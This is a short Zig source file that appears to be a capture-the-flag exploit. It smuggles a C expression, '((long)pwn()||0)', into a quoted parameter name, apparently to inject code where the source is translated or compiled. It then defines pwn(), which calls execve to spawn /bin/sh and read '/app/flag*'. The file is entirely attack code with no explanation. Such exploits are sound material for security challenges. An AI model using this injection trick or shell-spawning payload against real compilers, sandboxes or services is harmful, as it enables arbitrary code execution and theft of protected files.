// zig fmt: off
const std = @import("std");
const linux = std.os.linux;



export fn _start(@"((long)pwn()||0)": i32) callconv(.C) void {
    _ = @"((long)pwn()||0)";
    @call(.never_inline, pwn, .{});
}

export fn pwn() void {
    const argv: [3:null]?[*:0]const u8 = .{ "/bin/sh", "-c", "cat /app/flag*" };
    _ = linux.syscall3(linux.SYS.execve, @intFromPtr("/bin/sh"), @intFromPtr(&argv), 0);
    _ = linux.syscall1(linux.SYS.exit, 0);
}
